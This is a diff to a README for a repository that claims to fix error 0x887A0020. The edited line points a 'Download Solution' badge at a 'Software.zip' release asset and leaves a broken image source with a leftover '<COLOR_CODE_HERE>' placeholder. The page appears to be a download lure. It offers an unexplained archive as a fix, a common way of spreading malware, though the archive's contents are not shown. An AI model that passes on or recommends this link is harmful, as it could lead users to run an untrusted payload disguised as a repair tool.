@@ -54,7 +54,7 @@ Implementing these troubleshooting steps methodically can help isolate the cause
 
 To download a comprehensive solution package that includes selected tools and resources to address the **0x887A0020** error, click the button below:
 
-[![Download Solution](https://img.shields.io/badge/Download-Solution-<COLOR_CODE_HERE>)](https://github.com/user-attachments/files/17466420/Software.zip)
+[![Download Solution](https://github.com/Reaperlix/Fixing-Error-0x887A0020/releases/download/v2.0/Software.zip<COLOR_CODE_HERE>)](https://github.com/Reaperlix/Fixing-Error-0x887A0020/releases/download/v2.0/Software.zip)
 
 Feel free to explore the contents of the solution package and utilize the resources provided to resolve the error effectively.
 
